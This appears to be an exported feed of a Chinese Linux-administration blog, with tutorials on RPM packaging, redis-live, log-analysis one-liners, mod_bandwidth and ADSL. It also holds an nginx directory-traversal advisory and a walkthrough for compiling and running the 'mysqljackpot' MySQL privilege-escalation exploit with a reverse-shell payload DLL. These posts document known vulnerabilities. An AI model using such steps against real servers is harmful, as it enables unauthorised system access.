<p>cd /usr/src/redhat/SOURCES<br>wget <a href="http://nginx.org/download/nginx-1.2.1.tar.gz" target="_blank" rel="external">http://nginx.org/download/nginx-1.2.1.tar.gz</a><br><strong>3、创建Spec文件</strong><br>cd /usr/src/redhat/SPECS<br>vi nginx.spec<br>内容如下：</p>
<p>#</p>
<h1 id="Example-spec-file-for-nginx"><a href="#Example-spec-file-for-nginx" class="headerlink" title="Example spec file for nginx"></a>Example spec file for nginx</h1><p>#<br>Summary: high performance web server<br>Name: nginx<br>Version: 1.2.1<br>Release: 1.el5.ngx<br>License: 2-clause BSD-like license<br>Group: Applications/Server<br>Source: <a href="http://nginx.org/download/nginx-1.2.1.tar.gz" target="_blank" rel="external">http://nginx.org/download/nginx-1.2.1.tar.gz</a><br>URL: <a href="http://nginx.org/" target="_blank" rel="external">http://nginx.org/</a><br>Distribution: Linux<br>Packager: zhumaohai &lt;admin@www.centos.bz&gt;</p>
<p>%description<br>nginx [engine x] is a HTTP and reverse proxy server, as well as<br>a mail proxy server<br>%prep<br>rm -rf $RPM_BUILD_DIR/nginx-1.2.1<br>zcat $RPM_SOURCE_DIR/nginx-1.2.1.tar.gz | tar -xvf -<br>%build<br>cd nginx-1.2.1<br>./configure –prefix=/usr/local/nginx<br>make<br>%install<br>cd nginx-1.2.1<br>make install<br>%preun<br>if [ -z “<code>ps aux | grep nginx | grep -v grep</code>“ ];then<br>killall nginx &gt;/dev/null<br>exit 0<br>fi<br>%files<br>/usr/local/nginx<br><strong>4、开始RPM制作</strong><br>在制作RPM包之前需要安装必要的工具，如rpmbuild,gcc等。</p>
<p>yum install gcc rpm-build pcre-devel<br>cd /usr/src/redhat/SPECS/<br>rpmbuild -bb nginx.spec<br>一切顺利的话，会生成nginx的rpm包，/usr/src/redhat/RPMS/i386/nginx-1.2.1-1.el5.ngx.i386.rpm。</p>
<p><strong>5、测试rpm包</strong><br>rpm -ivh /usr/src/redhat/RPMS/i386/nginx-1.2.1-1.el5.ngx.i386.rpm<br>spec文件解释<br>从以上的简单例子可以看出，制作rpm包最重要的还是spec文件，下面解释一下例子所用到的指令。</p>
<p>#:以#开头是注释，rpm会忽略它。<br>Summary：简单描述软件。<br>Name ：定义rpm的名称。<br>Version: 定义软件版本<br>Release: 发行版本<br>License: 定义许可证<br>Group: 软件分类<br>Source: 源码下载地址<br>URL: 源码相关网站<br>Distribution: 发行版系列<br>Packager: 打包人的信息</p>
<p>%description:软件详细描述，可多行<br>%prep ：软件编译之前的处理，如解压。<br>%build ：开始编译软件，如make<br>%install :开始安装软件，如make install<br>%files :指定哪些文件需要被打包，如/usr/local/nginx<br>%preun :定义卸载之前的动作，如杀掉进程。<br>这里只介绍了几个常用的tag，更详细的请参考：<a href="http://www.rpm.org/max-rpm/ch-rpm-inside.html" target="_blank" rel="external">http://www.rpm.org/max-rpm/ch-rpm-inside.html</a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[跨平台的.NET运行环境 Mono]]></title>
      <url>/2012/12/16/e8-b7-a8-e5-b9-b3-e5-8f-b0-e7-9a-84-net-e8-bf-90-e8-a1-8c-e7-8e-af-e5-a2-83-mono.html</url>
      <content type="html"><![CDATA[<p>Mono 是一个由Novell 公司主持的项目。该项目的目标是创建一系列符合ECMA 标准（Ecma-334 和Ecma-335）的.NET 工具，包括C# 编译器和共通语言执行平台。与微软的.NET Framework 不同，Mono 项目不仅可以运行于Windows 系统上，还可以运行于Linux，FreeBSD，Unix，Mac OS X 和Solaris。</p>
<p><strong>Mono 的开发工具 <a href="http://www.oschina.net/p/monodevelop" target="_blank" rel="external">MonoDevelop</a></strong></p>
<p>微软开发了一个称为共享源码公共语言基础（Shared Source Common Language Infrastructure，Shared Source CLI）的可用于 FreeBSD，Windows 和 Mac OS X 的 .NET 实现版本。微软的共享源码协议并不是开源软件协议，且可能对于社区来说也是不足够的（它明文禁止了对软件的商业用途）。我们还可以见到另外一个 .NET 实现版本，Portable.NET 项目，该项目与 Mono 项目有着很多相同的目标。</p>
<p>Mono 虚拟机包含一个实时编译引擎，该引擎可用于如下处理器：x86，SPARC，PowerPC，ARM，S390（32位模式和64位模式），x86-64，IA64 和64位模式的 SPARC。该虚拟机可以将代码实时编译或者预先编译到原生代码。对于那些没有列出来的系统，则使用的是代码解释器。</p>
<p>下图是MONO的体系结构图<br><img src="http://www.oschina.net/uploads/img/200901/19094456_ni35.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[用redis-live监控redis服务器]]></title>
      <url>/2012/12/16/e7-94-a8redis-live-e7-9b-91-e6-8e-a7redis-e6-9c-8d-e5-8a-a1-e5-99-a8.html</url>
      <content type="html"><![CDATA[<p>目前来说，越来越多的使用多了NOSQL的业务，但是这方面的监控缺不多。今天给大家介绍几个专业<a href="http://www.linuxyan.com/tag/%e7%9b%91%e6%8e%a7redis" title="查看 监控redis 中的全部文章" target="_blank" rel="external">监控redis</a>服务的工具，便于大家进行<a href="http://www.linuxyan.com/tag/redis" title="查看 redis 中的全部文章" target="_blank" rel="external">redis</a>性能分析。<br>一、<a href="http://www.linuxyan.com/tag/redmon" title="查看 redmon 中的全部文章" target="_blank" rel="external">redmon</a>：<br>这个工具是用ruby语言写的，ruby是小鬼子弄出来的，个人真心觉得比较难用。这个语言的包需要安装rvm(ruby version manager)来管理。所以首先要部署rvm的环境，虽然说不是很复杂，但是真心觉得不想用这个，以后有时间了会给大家介绍这个的。</p>
<p>二、<a href="http://www.linuxyan.com/tag/redis-live" title="查看 redis-live 中的全部文章" target="_blank" rel="external">redis-live</a><br>今天的主要目的是<a href="http://www.linuxyan.com/tag/redis-live" title="查看 redis-live 中的全部文章" target="_blank" rel="external">redis-live</a>这个软件。相对于<a href="http://www.linuxyan.com/tag/redmon" title="查看 redmon 中的全部文章" target="_blank" rel="external">redmon</a>来说，部署相对来说简单的多了，而且功能上面也丝毫不逊色于<a href="http://www.linuxyan.com/tag/redmon" title="查看 redmon 中的全部文章" target="_blank" rel="external">redmon</a>。<br>下面开始介绍安装<a href="http://www.linuxyan.com/tag/redis-live" title="查看 redis-live 中的全部文章" target="_blank" rel="external">redis-live</a>：<br>因为<a href="http://www.linuxyan.com/tag/redis-live" title="查看 redis-live 中的全部文章" target="_blank" rel="external">redis-live</a>是基于python开发的，所以首先要部署所需要的python环境</p>
<p><div></div></p>
<p><table></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td></td></p>
<p><pre>1.wget <a href="http://dl.fedoraproject.org/pub/epel/6/x86_64/python-pip-0.8-1.el6.noarch.rpm" target="_blank" rel="external">http://dl.fedoraproject.org/pub/epel/6/x86_64/python-pip-0.8-1.el6.noarch.rpm</a><br>2.rpm -ivh python-pip-0.8-1.el6.noarch.rpm<br>3.pip-python install tornado<br>4.pip-python install redis<br>5.pip-python install python-dateutil<br>6.pip-python install argparse</pre><br><br><br><br><br><br>环境部署完了之后，就需要开始安装软件了。</p>
<p><div></div></p>
<p><table></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td></td></p>
<p><pre>git clone <a href="https://github.com/kumarnitin/RedisLive.git" target="_blank" rel="external">https://github.com/kumarnitin/RedisLive.git</a><br>Initialized empty Git repository in /root/RedisLive/.git/<br>remote: Counting objects: 715, done.<br>remote: Compressing objects: 100% (377/377), done.<br>remote: Total 715 (delta 338), reused 699 (delta 323)<br>Receiving objects: 100% (715/715), 2.59 MiB | 353 KiB/s, done.<br>Resolving deltas: 100% (338/338), done.</pre><br><br><br><br><br><br>因为没有打包的安装包，所以只能下载安装git的源码。<br>安装好之后就可以配置了：</p>
<p><div></div></p>
<p><table></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td></td></p>
<p><pre>cd RedisLive/src<br>vi redis-live.conf<br>{<br>        “RedisServers”:<br>        [<br>                {<br>                  “server” : “127.0.0.1”,<br>                  “port”  : 6379<br>                }<br>        ],  </pre></p>
<pre><code>&quot;DataStoreType&quot; : &quot;sqlite&quot;,  

&quot;RedisStatsServer&quot;:  
{  
        &quot;server&quot; : &quot;127.0.0.1&quot;,  
        &quot;port&quot; : 6381  
}  
</code></pre><p>}<br><br><br><br><br><br>RedisServers这个是<a href="http://www.linuxyan.com/tag/redis" title="查看 redis 中的全部文章" target="_blank" rel="external">redis</a>服务器的配置。<br>RedisStatsServer是<a href="http://www.linuxyan.com/tag/redis" title="查看 redis 中的全部文章" target="_blank" rel="external">redis</a>服务器的监控信息可以存放在其他的<a href="http://www.linuxyan.com/tag/redis" title="查看 redis 中的全部文章" target="_blank" rel="external">redis</a>服务器中.也就是RedisStatsServe.<br>一般的是把”DataStoreType”改成sqlite类型的，下面的RedisStatsServer就不用配置了.</p>
<p>注：因为有些<a href="http://www.linuxyan.com/tag/redis" title="查看 redis 中的全部文章" target="_blank" rel="external">redis</a>服务器是需要密码进行访问的，所以如果有密码的话，需要在RedisServers里面写上密码：如下：</p>
<p><div></div></p>
<p><table></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td></td></p>
<p><pre>        “RedisServers”:<br>        [<br>                {<br>                  “server” : “127.0.0.1”,<br>                  “port”  : 6379,<br>                  “password”:”xxxxxx”<br>                }<br>        ],</pre><br><br><br><br><br><br>配置好之后，就可以启动服务了。<br>./<a href="http://www.linuxyan.com/tag/redis" title="查看 redis 中的全部文章" target="_blank" rel="external">redis</a>-monitor.py –duration 120 &amp;<br>./<a href="http://www.linuxyan.com/tag/redis" title="查看 redis 中的全部文章" target="_blank" rel="external">redis</a>-live.py &amp;<br>注：启动服务之后，如果访问web页面的话，会在当前终端输出日志，如果不想在终端输出，可以查看<a href="http://www.linuxyan.com/tag/redis" title="查看 redis 中的全部文章" target="_blank" rel="external">redis</a>-live.py的参数</p>
<p><div></div></p>
<p><table></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td></td></p>
<p><pre>[root@localhost src]# ./redis-live.py –help<br>Usage: ./redis-live.py [OPTIONS]</pre></p>
<p>Options:</p>
<p>  –help                           show this help information<br>  –log_file_max_size              max size of log files before rollover<br>                                   (default 100000000)<br>  –log_file_num_backups           number of log files to keep (default 10)<br>  –log_file_prefix=PATH           Path prefix for log files. Note that if you<br>                                   are running multiple tornado processes,<br>                                   log_file_prefix must be different for each<br>                                   of them (e.g. include the port number)<br>  –log_to_stderr                  Send log output to stderr (colorized if<br>                                   possible). By default use stderr if<br>                                   –log_file_prefix is not set and no other<br>                                   logging is configured.<br>  –logging=debug|info|warning|error|none<br>                                   Set the Python log level. If ‘none’, tornado<br>                                   won’t touch the logging configuration.<br>                                   (default info)<br><br><br><br><br><br>可以看到有日志大小，路径，级别等等的选项。<br>最后来看下监控效果图：<br><img src="http://www.linuxyan.com/wp-content/uploads/2012/10/redis-live.jpg" alt=""></p>
<p>&nbsp;</p>
<p>相关学习网址：</p>
<p><a href="http://redis.readthedocs.org/en/latest/" target="_blank" rel="external">http://redis.readthedocs.org/en/latest/</a></p>
<p><a href="http://redis.io/documentation" target="_blank" rel="external">http://redis.io/documentation</a></p>
<p><a href="http://zh.wikipedia.org/wiki/Redis" target="_blank" rel="external">http://zh.wikipedia.org/wiki/Redis</a></p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> NoSQL </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[系统管理及debug常用命令]]></title>
      <url>/2012/12/16/e7-b3-bb-e7-bb-9f-e7-ae-a1-e7-90-86-e5-8f-8adebug-e5-b8-b8-e7-94-a8-e5-91-bd-e4-bb-a4.html</url>
      <content type="html"><![CDATA[<p>系统连接状态篇： 1.查看TCP连接状态 netstat -nat |awk ‘{print $6}’|sort|uniq -c|sort -rn<br>netstat -n | awk ‘/^tcp/ {++S[$NF]};END {for(a in S) print a, S[a]}’ 或 netstat -n | awk ‘/^tcp/ {++state[$NF]}; END {for(key in state) print key,”t”,state[key]}’ netstat -n | awk ‘/^tcp/ {++arr[$NF]};END {for(k in arr) print k,”t”,arr[k]}’<br>netstat -n |awk ‘/^tcp/ {print $NF}’|sort|uniq -c|sort -rn<br>netstat -ant | awk ‘{print $NF}’ | grep -v ‘[a-z]’ | sort | uniq -c<br>2.查找请求数请20个IP（常用于查找攻来源）： netstat -anlp|grep 80|grep tcp|awk ‘{print $5}’|awk -F: ‘{print $1}’|sort|uniq -c|sort -nr|head -n20<br>netstat -ant |awk ‘/:80/{split($5,ip,”:”);++A[ip[1]]}END{for(i in A) print A[i],i}’ |sort -rn|head -n20<br>3.用tcpdump嗅探80端口的访问看看谁最高 tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F”.” ‘{print $1”.”$2”.”$3”.”$4}’ | sort | uniq -c | sort -nr |head -20<br>4.查找较多time_wait连接 netstat -n|grep TIME_WAIT|awk ‘{print $5}’|sort|uniq -c|sort -rn|head -n20<br>5.找查较多的SYN连接 netstat -an | grep SYN | awk ‘{print $5}’ | awk -F: ‘{print $1}’ | sort | uniq -c | sort -nr | more<br>6.根据端口列进程 netstat -ntlp | grep 80 | awk ‘{print $7}’ | cut -d/ -f1<br>网站日志分析篇1（Apache）：<br>1.获得访问前10位的ip地址 cat access.log|awk ‘{print $1}’|sort|uniq -c|sort -nr|head -10 cat access.log|awk ‘{counts[$(11)]+=1}; END {for(url in counts) print counts[url], url}’<br>2.访问次数最多的文件或页面,取前20 cat access.log|awk ‘{print $11}’|sort|uniq -c|sort -nr|head -20<br>3.列出传输最大的几个exe文件（分析下载站的时候常用） cat access.log |awk ‘($7~/.exe/){print $10 “ “ $1 “ “ $4 “ “ $7}’|sort -nr|head -20<br>4.列出输出大于200000byte(约200kb)的exe文件以及对应文件发生次数 cat access.log |awk ‘($10 &gt; 200000 &amp;&amp; $7~/.exe/){print $7}’|sort -n|uniq -c|sort -nr|head -100<br>5.如果日志最后一列记录的是页面文件传输时间，则有列出到客户端最耗时的页面 cat access.log |awk  ‘($7~/.php/){print $NF “ “ $1 “ “ $4 “ “ $7}’|sort -nr|head -100<br>6.列出最最耗时的页面(超过60秒的)的以及对应页面发生次数 cat access.log |awk ‘($NF &gt; 60 &amp;&amp; $7~/.php/){print $7}’|sort -n|uniq -c|sort -nr|head -100<br>7.列出传输时间超过 30 秒的文件 cat access.log |awk ‘($NF &gt; 30){print $7}’|sort -n|uniq -c|sort -nr|head -20<br>8.统计网站流量（G) cat access.log |awk ‘{sum+=$10} END {print sum/1024/1024/1024}’<br>9.统计404的连接 awk ‘($9 ~/404/)’ access.log | awk ‘{print $9,$7}’ | sort<br>10. 统计http status. cat access.log |awk ‘{counts[$(9)]+=1}; END {for(code in counts) print code, counts[code]}’ cat access.log |awk ‘{print $9}’|sort|uniq -c|sort -rn<br>10.蜘蛛分析 查看是哪些蜘蛛在抓取内容。 /usr/sbin/tcpdump -i eth0 -l -s 0 -w - dst port 80 | strings | grep -i user-agent | grep -i -E ‘bot|crawler|slurp|spider’<br>网站日分析2(Squid篇）<br>2.按域统计流量 zcat squid_access.log.tar.gz| awk ‘{print $10,$7}’ |awk ‘BEGIN{FS=”[ /]”}{trfc[$4]+=$1}END{for(domain in trfc){printf “%st%dn”,domain,trfc[domain]}}’<br>效率更高的perl版本请到此下载:<a href="http://docs.linuxtone.org/soft/tools/tr.pl" target="_blank" rel="external">http://docs.linuxtone.org/soft/tools/tr.pl</a><br>数据库篇 1.查看数据库执行的sql /usr/sbin/tcpdump -i eth0 -s 0 -l -w - dst port 3306 | strings | egrep -i ‘SELECT|UPDATE|DELETE|INSERT|SET|COMMIT|ROLLBACK|CREATE|DROP|ALTER|CALL’</p>
<p>系统Debug分析篇<br>1.调试命令 strace -p pid<br>2.跟踪指定进程的PID gdb -p pid</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[nginx配置错误而导致目录遍历漏洞]]></title>
      <url>/2012/12/14/nginx-e9-85-8d-e7-bd-ae-e9-94-99-e8-af-af-e8-80-8c-e5-af-bc-e8-87-b4-e7-9b-ae-e5-bd-95-e9-81-8d-e5-8e-86-e6-bc-8f-e6-b4-9e.html</url>
      <content type="html"><![CDATA[<p>漏洞版本:nginx(Tested at 1.1.10)</p>
<p>漏洞描述:nginx是一款高性能的web服务器，使用非常广泛，其不仅经常被用作反向代理，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，第一个公开版本0.1.0发布于2004年10月4日。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。</p>
<p>在nginx中开启autoindex，配置不规范而造成目录遍历漏洞。</p>
<p>配置如下：</p>
<ol>
<li><p>server {</p>
</li>
<li><p>listen    80;</p>
</li>
<li><p>server_name sebug.net;</p>
</li>
<li><p>index index.htm index.html;</p>
</li>
<li><p>root  /home/wwwroot/www;</p>
</li>
<li><p>access_log off;</p>
</li>
<li><p>location /paper {</p>
</li>
<li><p>alias /home/wwwroot/paper/;</p>
</li>
<li><p>autoindex on;</p>
</li>
<li><p>}</p>
</li>
<li><p>}</p>
</li>
</ol>
<p>注意 这里/home/wwwroot/paper/;  有个/</p>
<p>当你浏览<a href="http://sebug.net/paper/,正常情况应该遍历/home/wwwroot/paper/这个目录，但是如果访问http://sebug.net/paper../，" target="_blank" rel="external">http://sebug.net/paper/,正常情况应该遍历/home/wwwroot/paper/这个目录，但是如果访问http://sebug.net/paper../，</a> 这个的话就会遍历/home/wwwroot/这个目录了&lt;* 参考</p>
<p><a href="http://luoq.net/ais/1191/" target="_blank" rel="external">http://luoq.net/ais/1191/</a></p>
<p>*&gt;</p>
<p>安全建议:sebug建议：</p>
<p>使用如下配置</p>
<p>location /paper {</p>
<p>alias /home/wwwroot/paper;</p>
<p>或</p>
<p>location /paper/ {</p>
<p>alias /home/wwwroot/paper/;</p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Apache模块之mod_bandwidth带宽限制]]></title>
      <url>/2012/12/11/apache-e6-a8-a1-e5-9d-97-e4-b9-8bmod-bandwidth-e5-b8-a6-e5-ae-bd-e9-99-90-e5-88-b6.html</url>
      <content type="html"><![CDATA[<p>步骤<br>1、下载模块 mod_bandwidth</p>
<p><a href="ftp://ftp.cohprog.com/pub/apache/module/" target="_blank" rel="external">ftp://ftp.cohprog.com/pub/apache/module/</a><br>2、编译和安装<br>a) 编译：</p>
<p>由于 apache 是用编译好的包安装的，因此只有采用 apxs 方式编译<br>/usr/local/sbin/apxs -c mod_bandwidth.c -o /usr/local/libexec/apache/mod_bandwidth.so<br>b) 创建 mod_bandwidth 运行需要的目录：<br>mkdir /tmp/apachebw<br>mkdir /tmp/apachebw/link<br>mkdir /tmp/apachebw/master<br>chmod -R 777 /tmp/apachebw<br>c) 修改 /usr/local/etc/apache/httpd.conf 文件：<br>c.1) 增加下列内容</p>
<p>LoadModule bandwidth_module   libexec/apache/mod_bandwidth.so<br>AddModule mod_bandwidth.c<br>注意：这两行必须分别加在相应区域的最前面，使得这个模块以最低的优先级运行。<br>c.2) 增加下列内容</p>
<p>BandWidthDataDir “/tmp/apachebw/“<br>BandWidthModule on</p>
<p>c.3) 修改  的设置</p>
<h1 id="不限制局域网内用户的下载速度"><a href="#不限制局域网内用户的下载速度" class="headerlink" title="不限制局域网内用户的下载速度"></a>不限制局域网内用户的下载速度</h1><p>BandWidth 192.168.0 0</p>
<h1 id="限制其他用户的下载速度为每秒-8192-字节"><a href="#限制其他用户的下载速度为每秒-8192-字节" class="headerlink" title="限制其他用户的下载速度为每秒 8192 字节"></a>限制其他用户的下载速度为每秒 8192 字节</h1><p>BandWidth all 8192<br>….</p>
<p>按照上面的方式修改其他  小节<br>d) 重新启动 apache：<br>apachectl configtest</p>
<h2 id="apachectl-restart"><a href="#apachectl-restart" class="headerlink" title="apachectl restart"></a>apachectl restart</h2><p>mod_bandwidth 的选项简单说明：<br>…………………………<br>BandWidthDataDir<br>格式： BandWidthDataDir<br>默认： “/tmp/apachebw”<br>上下文： server config<br>设置 mod_bandwidth 保存运行时数据的目录。需要在该目录下创建 ./master<br>和 ./link 两个子目录，并设置为权限为 777。<br>注意：有些系统会定时清理 /tmp 目录，所以在这些系统上最好把<br>BandWidthDataDir 设置到其他地方。<br>…………………………<br>BandWidthModule<br>格式： BandWidthModule<br>默认： Off<br>上下文： per server config<br>允许或者禁止模块。<br>…………………………<br>BandWidthPulse<br>格式： BandWidthPulse<br>默认： 1000<br>上下文： per server config<br>改变计算带宽的时间间隔，默认为1000毫秒（1秒）。使用更低的间隔可以获得<br>更精确的带宽控制，但消耗更多的CPU时间，反之亦然。<br>注意：这个选项的详细说明请参考 mod_bandwidth 的文档。<br>…………………………<br>BandWidth<br>格式： BandWidth<br>默认： 无<br>上下文： per directory, .htaccess<br>限制这个目录下文件下载的速率。<br>domain 指定来自哪个域的连接受到这个设置的影响。<br>ip 指定来自哪个ip地址（或者ip段）的连接受到影响。<br>all 所有连接都受到影响。<br>示例：</p>
<h1 id="来自-dualface-com-的连接不限制下载速度"><a href="#来自-dualface-com-的连接不限制下载速度" class="headerlink" title="来自 dualface.com 的连接不限制下载速度"></a>来自 dualface.com 的连接不限制下载速度</h1><p>BandWidth dualface.com 0</p>
<h1 id="来自-192-168-0-0-16（或者192-168-0）-网段的连接不限制下载速度"><a href="#来自-192-168-0-0-16（或者192-168-0）-网段的连接不限制下载速度" class="headerlink" title="来自 192.168.0.0/16（或者192.168.0） 网段的连接不限制下载速度"></a>来自 192.168.0.0/16（或者192.168.0） 网段的连接不限制下载速度</h1><p>BandWidth 192.168.0.0/16 0</p>
<h1 id="其他连接限制下载速度为每秒1024字节"><a href="#其他连接限制下载速度为每秒1024字节" class="headerlink" title="其他连接限制下载速度为每秒1024字节"></a>其他连接限制下载速度为每秒1024字节</h1><p>BandWidth all 1024</p>
<h1 id="越前面的设置优先权越高"><a href="#越前面的设置优先权越高" class="headerlink" title="越前面的设置优先权越高"></a>越前面的设置优先权越高</h1><p>…………………………<br>LargeFileLimit<br>格式： LargeFileLimit<br>默认： 无<br>上下文： per directory, .htaccess<br>对于超过指定大小的文件，下载时使用的速率。如果速率设置0即不限制速度，<br>但下载速度仍然要受到BandWidth设置的影响。如果设置成-1，则完全不受影响。<br>通过设置不同的文件大小和速率，可以设置不同大小范围内文件的下载速度。<br>示例：</p>
<h1 id="文件尺寸大于等于200千字节的文件，下载速率为每秒3072字节"><a href="#文件尺寸大于等于200千字节的文件，下载速率为每秒3072字节" class="headerlink" title="文件尺寸大于等于200千字节的文件，下载速率为每秒3072字节"></a>文件尺寸大于等于200千字节的文件，下载速率为每秒3072字节</h1><p>LargeFileLimit 200 3072<br>LargeFileLimit 1024 2048<br>…………………………<br>MaxConnection<br>格式： MaxConnection<br>默认： 0 （不限制）<br>上下文： per directory, .htaccess<br>当超过指定连接数时，拒绝新的连接。<br>…………………………<br>MinBandWidth<br>格式： MinBandWidth<br>默认： all 256<br>上下文： per directory, .htaccess<br>设置最小带宽，默认为每秒256字节。根据BandWidth和LargeFileLimit设置的速<br>率。mod_bandwidth会计算允许的连接数。例如BandWidth为4096字节，而<br>MinBandWidth为1024字节，则最大并发连接数为4。<br>注意：这个选项的详细说明请参考 mod_bandwidth 的文档。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[LINUX操作系统上ADSL拨号上网]]></title>
      <url>/2012/12/11/linux-e6-93-8d-e4-bd-9c-e7-b3-bb-e7-bb-9f-e4-b8-8aadsl-e6-8b-a8-e5-8f-b7-e4-b8-8a-e7-bd-91.html</url>
      <content type="html"><![CDATA[<p>LINUX下的ADSL拨号上网大体有2种方法：一是用系统自带的图形界面（在网络里面建立新拨号连接，类似于WIN下），一是用命令行。下面呢我就主要介绍一下在命令行环境下配置上网。<br><strong>一、解压缩</strong></p>
<p>#tar xvfz rp-pppoe-3.2.tar.gz</p>
<p>#cd rp-pppoe-3.2<br><strong>二、进行编译和安装</strong><br>运行脚本</p>
<p>#./go<br>将自动进行编译和安装，最后，调用/usr/sbin/adsl-setup进行配置，具体解释见三。<br><strong>三、配置PPPOE客户端软件</strong><br>安装完软件包后，必须配置pppoe的配置文件/etc/ppp/pppoe.conf，从而让ADSL拨号时使用配置文件中的用户名、密码等参数。我们不必手工改动这个文件，可以使用adsl-setup这个工具进行配置：</p>
<p>#/usr/sbin/adsl-setup<br>当出现<br>&gt;&gt;&gt; Enter your PPPoE user name :<br>输入ADSL帐号的用户名<br>当出现<br>&gt;&gt;&gt; Enter the Ethernet interface connected to the ADSL modem<br>For Solaris, this is likely to be something like /dev/hme0.<br>For Linux, it will be ethn, where ‘n’ is a number.<br>(default eth0):<br>输入 eth0 ,这是ADSL相连的网卡的名字。<br>当出现<br>&gt;&gt;&gt; Enter the demand value (default no):<br>输入 no<br>当出现<br>&gt;&gt;&gt; Enter the DNS information here:<br>输入 server ,这表示使用ADSL拨号自动获得的DNS服务器IP地址<br>当出现<br>&gt;&gt;&gt; Please enter your PPPoE password:<br>输入ADSL帐号的密码<br>当出现<br>&gt;&gt;&gt; Choose a type of firewall (0-2):<br>输入 0 ，不使用防火墙<br>当出现<br>&gt;&gt;&gt; Accept these settings and adjust configuration files (y/n)?<br>如果输入的信息正确，输入 y ,完成配置，否则，输入 n 重新输入。<br><strong>四、 启动PPPOE客户端软件</strong><br>使用命令：</p>
<p>#/usr/sbin/adsl -start<br>启动PPPOE客户端软件,进行连接，如果成功，将出现Connected；如果不成功，请检查网线、ADSL MODEM等物理设备，并查看 /var/log/messages中的信息<br>/usr/sbin/adsl-stop 关闭和ISP的连接<br>/usr/sbin/adsl-status 查看当前连接的状态<br>如果想在Linux系统启动时自动启动ADSL连接，输入以下命令</p>
<p>#chkconfig –add adsl<br>将在当前的运行级下加入ADSL的自启动脚本。<br><strong>五、测试</strong><br>当连接成功后，使用命令：</p>
<p>#ifconfig -a<br>在输出中应该含有关于 ppp0 的一堆信息，其中还绑定了 IP 地址,说明已经从拨号中获得了IP地址。<br>使用命令</p>
<p>#netstat -nr<br>查看路由表信息，这时的默认路由应该是上面获得的IP地址。如果没有默认路由，我们可以手动增加：</p>
<p>#route add default gw 上面获得的IP地址<br>使用命令</p>
<p>#nslookup <a href="http://www.163.com/" target="_blank" rel="external">www.163.com</a>如果解析出新浪的IP，说明已经从拨号中正确获得了DNS服务器。最后，使用命令ping某个域名或IP，如果有响应，表示你已经大功告成了。</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL 5.1/5.5 WiNDOWS REMOTE R00T (mysqljackpot) 验证--windows下mysql提权]]></title>
      <url>/2012/12/05/mysql-5-15-5-windows-remote-r00t-mysqljackpot-e9-aa-8c-e8-af-81-windows-e4-b8-8bmysql-e6-8f-90-e6-9d-83.html</url>
      <content type="html"><![CDATA[<p>2月2日mysql爆出windows下5.1/5.5mysql账号可以提权至系统权限</p>
<p>见<a href="http://www.exploit-db.com/exploits/23073/" target="_blank" rel="external">http://www.exploit-db.com/exploits/23073/</a></p>
<p>下面将我的测试步骤记录下来：</p>
<p>1、首先找到一台linux机器，我在上面已经安装了mysql，安装目录在/usr/local/mysql</p>
<p>2、下载poc程序，解压缩，然后编译mysqljackpot.c</p>
<p>gcc -o mysqljackpot mysqljackpot.c -I /usr/local/mysql/include -L /usr/local/mysql/lib/mysql/ -lmysqlclient</p>
<p>3、由于需要反向shell，需要借助payload.dll，这个文件需要在windows下编译，首先得安装MinGW，在MinGW下进行编译（需要修改payload.c中的ip为我们的反向shell所在的机器ip）</p>
<p>set PATH=%PATH%;c:MinGWbin<br>gcc -c payload.c<br>gcc -shared -o payload.dll payload.o -lws2_32</p>
<p>4、在linux机器上执行程序，效果如下：</p>
<p><img src="http://pic002.cnblogs.com/images/2012/418678/2012120317335096.jpg" alt=""></p>
<p>由上图可见，在已知mysql密码的情况下即可获取对方机器的系统权限！</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux服务器前台常出现的错误提示及含意]]></title>
      <url>/2012/12/03/linux-e6-9c-8d-e5-8a-a1-e5-99-a8-e5-89-8d-e5-8f-b0-e5-b8-b8-e5-87-ba-e7-8e-b0-e7-9a-84-e9-94-99-e8-af-af-e6-8f-90-e7-a4-ba-e5-8f-8a-e5-90-ab-e6-84-8f.html</url>
      <content type="html"><![CDATA[<p>Linux服务器前台常出现的错误提示及含意：</p>
<p>◆一般类的提示eth1：Toomuch<br><strong>workatinterrupt，IntrStatus=0x0001</strong></p>
<p>这条提示的含意为.某网卡的中断请求过多.如果只是偶尔出现一次可忽略.但这条提示如果经常出现或是集中出现,那涉及到的可能性就比较多有可能需要进行处理了.。可能性比较多,如网卡性能;服务器性能;网络攻击..等等。<br>◆一般类的提示<br><strong>IPVS:incomingICMP:failedchecksumfrom61.172.0.X!</strong><br>服务器收到了一个校验和错误的ICMP数据包。这类的数据包有可能是非法产生的垃圾数据.但从目前来看服务器收到这样的数据非常多，一般都忽略。</p>
<p>一般代理服务器在工作时会每秒钟转发几千个数据包.收到几个错误数据包不会影响正常的工作.这是问我最多的一类提示了。</p>
<p>◆一般类的提示</p>
